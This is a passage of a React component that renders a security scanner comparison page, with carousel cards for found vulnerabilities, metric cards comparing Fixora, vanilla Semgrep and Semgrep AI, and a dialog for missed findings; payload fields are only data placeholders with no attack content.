              >
                <CarouselContent>
                  {data.vulnerabilities.map((vuln, index) => (
                    <CarouselItem key={index} className="md:basis-1/1 lg:basis-1/1">
                      <Card className="border-border shadow-sm overflow-hidden h-full">
                        <CardHeader className="bg-muted/30 border-b border-border pb-6">
                          <div className="flex items-center justify-between mb-4">
                            <Badge variant="destructive" className="px-3 py-1 text-xs font-medium tracking-wide">HIGH SEVERITY</Badge>
                            <span className="text-xs font-mono text-muted-foreground bg-muted px-2 py-1 rounded">
                              {vuln.file}:{vuln.line}
                            </span>
                          </div>
                          <CardTitle className="text-xl text-foreground flex items-center gap-2">
                            <Bug className="w-5 h-5 text-destructive" />
                            {vuln.name}
                          </CardTitle>
                        </CardHeader>
                        <CardContent className="p-0">
                          <div className="grid grid-cols-1 lg:grid-cols-2">
                            <div className="p-6 border-b lg:border-b-0 lg:border-r border-border bg-card">
                              <h4 className="text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-3 flex items-center gap-2">
                                <Code2 className="w-4 h-4" /> The Mechanism
                              </h4>
                              <p className="text-sm text-card-foreground leading-relaxed mb-6">
                                {vuln.whatIsIt}
                              </p>
                              
                              <h4 className="text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-3">
                                Target Code
                              </h4>
                              <div className="bg-zinc-950 p-4 rounded-lg overflow-x-auto border border-zinc-800">
                                <pre className="text-xs text-zinc-300 font-mono whitespace-pre-wrap">
                                  {vuln.codeSnippet}
                                </pre>
                              </div>
                            </div>
                            
                            <div className="p-6 bg-muted/10">
                              <h4 className="text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-3 flex items-center gap-2">
                                <AlertTriangle className="w-4 h-4 text-orange-500" /> Exploitation
                              </h4>
                              
                              <div className="mb-6">
                                <div className="text-xs text-muted-foreground mb-1 font-medium">Malicious Payload</div>
                                <div className="bg-destructive/10 text-destructive font-mono text-xs p-3 rounded-md border border-destructive/20 break-all">
                                  {vuln.payload}
                                </div>
                              </div>
                              
                              <div>
                                <div className="text-xs text-muted-foreground mb-1 font-medium">Result / Impact</div>
                                <p className="text-sm text-foreground bg-background p-4 rounded-md border border-border">
                                  {vuln.result}
                                </p>
                              </div>
                            </div>
                          </div>
                        </CardContent>
                      </Card>
                    </CarouselItem>
                  ))}
                </CarouselContent>
                <CarouselPrevious className="-left-10" />
                <CarouselNext className="-right-10" />
              </Carousel>
            </div>

            {/* Performance Battle Cards */}
            <h3 className="text-xl font-bold mt-12 mb-4 border-b border-border pb-2 flex items-center gap-2">
              <BarChart3 className="w-5 h-5 text-primary" /> 
              Metrics
            </h3>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              {/* Fixora */}
              <Card className="border-primary/50 shadow-md relative overflow-hidden bg-card">
                <div className="absolute top-0 left-0 w-full h-1 bg-primary"></div>
                <CardHeader className="pb-4">
                  <div className="flex justify-between items-start">
                    <CardTitle className="text-lg font-bold text-foreground">Fixora (AI + Semgrep)</CardTitle>
                    {data.performance.fixora.score > 0 ? 
                      <CheckCircle2 className="w-5 h-5 text-green-500" /> : 
                      <XCircle className="w-5 h-5 text-destructive" />
                    }
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="mb-6 p-4 rounded-lg bg-muted/30 border border-border/50 text-sm leading-relaxed text-foreground min-h-[120px]">
                    {data.performance.fixora.description}
                  </div>
                  
                  <MetricBar 
                    label="Vulnerabilities Found" 
                    score={data.performance.fixora.score} 
                    total={data.performance.fixora.total}
                    colorClass="bg-primary" 
                  />
                  
                  <div className="mt-4 flex items-center justify-between text-sm">
                    <span className="text-muted-foreground">False Positives</span>
                    <Badge variant={data.performance.fixora.falsePositives === 0 ? "outline" : "destructive"} className="font-mono">
                      {data.performance.fixora.falsePositives}
                    </Badge>
                  </div>
                  
                </CardContent>
              </Card>

              {/* Vanilla Semgrep */}
              <Card className="border-border shadow-sm bg-card">
                <CardHeader className="pb-4">
                  <div className="flex justify-between items-start">
                    <CardTitle className="text-lg font-bold text-foreground">Vanilla Semgrep</CardTitle>
                    {data.performance.vanillaSemgrep.score > 0 ? 
                      <CheckCircle2 className="w-5 h-5 text-green-500" /> : 
                      <XCircle className="w-5 h-5 text-destructive" />
                    }
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="mb-6 p-4 rounded-lg bg-muted/30 border border-border/50 text-sm leading-relaxed text-foreground min-h-[120px]">
                    {data.performance.vanillaSemgrep.description}
                  </div>
                  
                  <MetricBar 
                    label="Vulnerabilities Found" 
                    score={data.performance.vanillaSemgrep.score} 
                    total={data.performance.vanillaSemgrep.total}
                  />
                  
                </CardContent>
              </Card>

              {/* Semgrep AI */}
              <Card className="border-border shadow-sm bg-card">
                <CardHeader className="pb-4">
                  <div className="flex justify-between items-start">
                    <CardTitle className="text-lg font-bold text-foreground">Semgrep AI</CardTitle>
                    {data.performance.semgrepAi.score > 0 ? 
                      <CheckCircle2 className="w-5 h-5 text-green-500" /> : 
                      <XCircle className="w-5 h-5 text-destructive" />
                    }
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="mb-6 p-4 rounded-lg bg-muted/30 border border-border/50 text-sm leading-relaxed text-foreground min-h-[120px]">
                    {data.performance.semgrepAi.description}
                  </div>
                  
                  <MetricBar 
                    label="Vulnerabilities Found" 
                    score={data.performance.semgrepAi.score} 
                    total={data.performance.semgrepAi.total}
                  />
                  
                </CardContent>
              </Card>
            </div>
            
            {/* Missed Vulns Trigger */}
            <div className="flex justify-center mt-8 pb-8">
              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline" className="border-border hover:bg-muted/50 text-muted-foreground transition-all">
                    View Missed Ones
                  </Button>
                </DialogTrigger>
                <DialogContent className="max-w-4xl max-h-[80vh] flex flex-col bg-card border-border">
                  <DialogHeader>
                    <DialogTitle className="text-xl">Missed Vulnerabilities & False Positives ({data.title})</DialogTitle>
                  </DialogHeader>
                  <div className="flex-1 overflow-y-auto bg-zinc-950 rounded-md border border-zinc-800 p-4 mt-4">
                    <pre className="text-sm font-mono text-zinc-300 whitespace-pre-wrap">
                      {data.missedLogs || data.rawLogs}
                    </pre>
                  </div>
                </DialogContent>
              </Dialog>
            </div>
            
          </motion.div>
        </AnimatePresence>
      </div>
    </DashboardLayout>
  );
};

export default Results;
